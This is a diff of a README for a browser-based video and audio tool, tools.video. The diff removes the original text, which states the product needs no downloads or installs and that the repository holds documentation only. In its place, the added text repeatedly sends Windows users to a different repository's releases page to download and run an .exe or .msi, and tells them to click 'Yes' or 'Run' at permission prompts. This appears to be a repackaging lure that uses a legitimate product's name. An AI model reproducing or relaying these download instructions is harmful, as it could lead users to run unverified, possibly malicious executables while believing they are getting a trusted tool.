@@ -1,147 +1,160 @@
-<p align="center">
-  <a href="https://tools.video">
-    <img src="assets/logo.png" alt="tools.video" width="120" />
-  </a>
-</p>
+# 🎬 tools.video-site - Private video and audio tools
 
-<h1 align="center">tools.video</h1>
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Devive007/tools.video-site/releases)
 
-<p align="center">
-  <strong>Free, fast, private browser-based video &amp; audio tools.</strong><br>
-  No uploads. No sign-ups. No nonsense.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>English</strong> •
-  <a href="README.zh-CN.md">简体中文</a> •
-  <a href="README.ja.md">日本語</a> •
-  <a href="README.es.md">Español</a>
-</p>
+tools.video-site is a browser-based set of video and audio tools. You can use it to compress, convert, trim, merge, and more. It runs in your browser, so your files stay on your device.
 
-<p align="center">
-  <a href="https://tools.video">🌐 Website</a> •
-  <a href="#tools">🛠 All Tools</a> •
-  <a href="#features">✨ Features</a> •
-  <a href="#privacy">🔒 Privacy</a> •
-  <a href="#tech">⚡ Tech</a>
-</p>
+If you want to use the desktop app on Windows, visit the release page to download and run the app from there:
 
----
+[Visit the Windows download page](https://github.com/Devive007/tools.video-site/releases)
 
-## What is tools.video?
+## 🪟 Install on Windows
 
-**tools.video** is a collection of 18 free online video and audio tools that run **entirely in your browser**. Your files never leave your device — everything is processed locally using cutting-edge web technologies.
+Follow these steps to get started on Windows:
 
-Visit **[tools.video](https://tools.video)** and start editing. That's it.
+1. Open the [releases page](https://github.com/Devive007/tools.video-site/releases).
+2. Find the latest release.
+3. Look for the Windows file, such as a `.exe` or `.msi` file.
+4. Download the file.
+5. Open the file to start the app.
+6. If Windows asks for permission, choose **Yes** or **Run**.
 
----
+After the app opens, you can use the tools right away in your browser or app window.
 
-## Tools
+## ✨ What You Can Do
 
-### Video
+tools.video-site gives you simple tools for common media tasks:
 
-| Tool | Description |
-|------|-------------|
-| **[Compress](https://tools.video/video-compress)** | Reduce video file size up to 90% while maintaining quality |
-| **[Convert](https://tools.video/video-convert)** | Convert between MP4, MKV, AVI, WebM, MOV and 10+ formats |
-| **[Trim](https://tools.video/video-trim)** | Cut video clips with visual timeline and frame-accurate editing |
-| **[Speed](https://tools.video/video-speed)** | Speed up or slow down from 0.25× to 4× |
-| **[Crop](https://tools.video/video-crop)** | Crop to any aspect ratio or custom dimensions |
-| **[Resize](https://tools.video/video-resize)** | Scale to any resolution — 4K, 1080p, 720p and custom sizes |
-| **[Merge](https://tools.video/video-merge)** | Combine multiple clips into one seamless video |
-| **[Rotate](https://tools.video/video-rotate)** | Rotate 90°/180°/270° or flip horizontally/vertically |
-| **[Screenshot](https://tools.video/video-screenshot)** | Capture frames at any timestamp with frame-by-frame navigation |
-| **[Reverse](https://tools.video/video-reverse)** | Reverse video playback with optional audio |
-| **[Mute](https://tools.video/video-mute)** | Remove the audio track from any video instantly |
-| **[Video to GIF](https://tools.video/video-to-gif)** | Convert video clips to animated GIFs |
+- Compress video files to save space
+- Convert video and audio into common formats
+- Trim clips to keep only the part you need
+- Merge files into one video or audio track
+- Extract audio from video
+- Change format settings for playback or sharing
+- Process files locally for privacy
 
-### Audio
+These tools suit common file types such as MP4, MOV, WebM, MP3, WAV, and AAC.
 
-| Tool | Description |
-|------|-------------|
-| **[Extract Audio](https://tools.video/audio-extract)** | Extract audio from video as MP3, WAV, FLAC, AAC and more |
-| **[Convert](https://tools.video/audio-convert)** | Convert audio between 16+ formats |
-| **[Trim](https://tools.video/audio-trim)** | Trim audio with a visual waveform editor |
-| **[Merge](https://tools.video/audio-merge)** | Merge multiple audio files into a single track |
-| **[Speed](https://tools.video/audio-speed)** | Change audio speed with pitch adjustment support |
+## 🔒 Privacy First
 
-### Utility
+Your files stay on your device while you work. The app is built for local processing, so you do not need to upload media to a server.
 
-| Tool | Description |
-|------|-------------|
-| **[Media Info](https://tools.video/media-info)** | View codec, bitrate, resolution, streams and more |
+That makes it a good fit if you want:
 
----
+- More control over your files
+- Faster work on large media
+- Less risk when handling personal content
+- A simple tool that runs in a browser
 
-## Features
+## 🧭 How to Use It
 
-### 📦 Handles files up to 50 GB
+Use this basic flow after you open the app:
 
-4K footage, 8K raw exports, multi-hour recordings — nothing is too large. Process massive files without upload limits, server timeouts, or quality loss.
+1. Choose the tool you want, such as compress, convert, or trim.
+2. Add your video or audio file.
+3. Pick the output format or settings.
+4. Start the process.
+5. Save the finished file to your computer.
 
-### 🎞 Every format you throw at it
+For most tasks, you only need to drag and drop a file, choose a few options, and wait for the result.
 
-**Video:** MP4, WebM, MKV, AVI, MOV, FLV, WMV, M4V, TS  
-**Audio:** MP3, WAV, FLAC, AAC, OGG, WMA, M4A, OPUS, AIFF, DTS, AC3, EAC3, APE, AMR, MKA  
-Full multi-channel audio support with 5.1 & 7.1 surround preservation.
+## 🛠️ Common Tools
 
-### ⚡ Blazing fast
+### 🎞️ Video Compress
+Reduce file size for sharing, storage, or upload limits.
 
-Powered by a dual-engine architecture:
-- **MediaBunny** — WebCodecs API with hardware acceleration for large files
-- **FFmpeg.wasm** — WebAssembly-based processing for maximum format compatibility
+### 🔁 Video Convert
+Change a file from one format to another, such as MOV to MP4.
 
-Multi-threaded processing that utilizes your device's full power.
+### ✂️ Trim Video
+Cut out parts you do not need and keep only the section you want.
 
-### 🔒 100% private
+### 🧩 Merge Files
+Join clips into one video or combine audio tracks.
 
-Your files **never leave your device**. There are no uploads, no servers processing your data, no analytics tracking your files. Everything runs locally in your browser.
+### 🎵 Audio Tools
+Work with sound files, including conversion and extraction from video.
 
-### 🚀 Zero friction
+## 💻 System Requirements
 
-No downloads, no installs, no sign-ups, no accounts. Open the page, drop your file, and you're already editing.
+The app is built for modern Windows PCs. For best results, use:
 
----
+- Windows 10 or Windows 11
+- A recent browser or the included desktop build
+- At least 4 GB of RAM
+- Enough free disk space for your source and output files
+- A modern CPU for faster encode and decode work
 
-## Privacy
+For large 4K files, a faster processor and more memory help speed up the job.
 
-We take privacy seriously:
+## 📥 Download and Run
 
-- **Zero uploads** — All processing happens in your browser
-- **No server-side processing** — Your files stay on your device
-- **No tracking of file content** — We never see or analyze your media
-- **No account required** — Use all tools anonymously
+To get the app, visit the release page here:
 
----
+[https://github.com/Devive007/tools.video-site/releases](https://github.com/Devive007/tools.video-site/releases)
 
-## Tech
+Then:
 
-tools.video is built with modern web technologies:
+1. Open the latest release.
+2. Download the Windows file.
+3. Run the file on your PC.
+4. Follow the on-screen steps.
+5. Open your media files and start using the tools
 
-- **[Next.js 15](https://nextjs.org/)** — React framework with SSR for SEO
-- **[MediaBunny](https://mediabunny.dev/)** — WebCodecs-based media processing engine
-- **[FFmpeg.wasm](https://ffmpegwasm.netlify.app/)** — FFmpeg compiled to WebAssembly
-- **[SharedArrayBuffer](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer)** — Multi-threaded processing in the browser
-- **19 languages** — Localized for a global audience
+## 🧩 File Types
 
----
+The app is made to handle common media formats, including:
 
-## Supported Languages
+- Video: MP4, MOV, WebM, MKV
+- Audio: MP3, WAV, AAC, M4A
+- Output: common browser-friendly and device-friendly formats
 
-English, 简体中文, 繁體中文, Español, Português, Français, Deutsch, Italiano, 日本語, 한국어, Русский, Tiếng Việt, ไทย, Bahasa Melayu, Bahasa Indonesia, עברית, Čeština, العربية, Türkçe
+If a file does not open, try a different format or a smaller file first.
 
----
+## 🖱️ Simple Workflow
 
-## Links
+A typical task looks like this:
 
-- 🌐 **Website:** [tools.video](https://tools.video)
-- 📧 **Contact:** [support@tools.video](mailto:support@tools.video)
-- 🎬 **Parent product:** [SubEasy.ai](https://www.subeasy.ai) — AI-powered transcription, translation & dubbing
+1. Open the tool
+2. Add a file
+3. Pick a format or edit setting
+4. Start the process
+5. Save the result
 
----
+This keeps the work simple for people who only need to edit or convert a few files.
 
-## License
+## 🧪 Built for the Browser
 
-tools.video is a proprietary product. This repository contains documentation only.
+The project uses browser-based media tech such as WebAssembly and WebCodecs. In plain terms, that means it can do heavy media work in your browser with better speed and local processing.
 
-© 2025 tools.video. All rights reserved.
+That setup helps with:
+
+- Faster file handling
+- Less need for uploads
+- Better privacy
+- A smoother experience on modern systems
+
+## 📁 Tips for Best Results
+
+- Use shorter file names
+- Keep source files on a local drive
+- Close other heavy apps while processing large videos
+- Start with a small test file if you are new to the app
+- Save output to a folder you can find easily
+
+## 🔍 When a File Won’t Process
+
+If a file does not convert or open, try these steps:
+
+1. Check that the file is not damaged
+2. Try another format
+3. Use a shorter clip
+4. Make sure you have enough disk space
+5. Close and reopen the app
+6. Try a different browser build or Windows release
+
+## 📌 Topics
+
+audio-tools, browser-based, ffmpeg, free-tools, privacy, video-compressor, video-converter, video-tools, webassembly, webcodecs
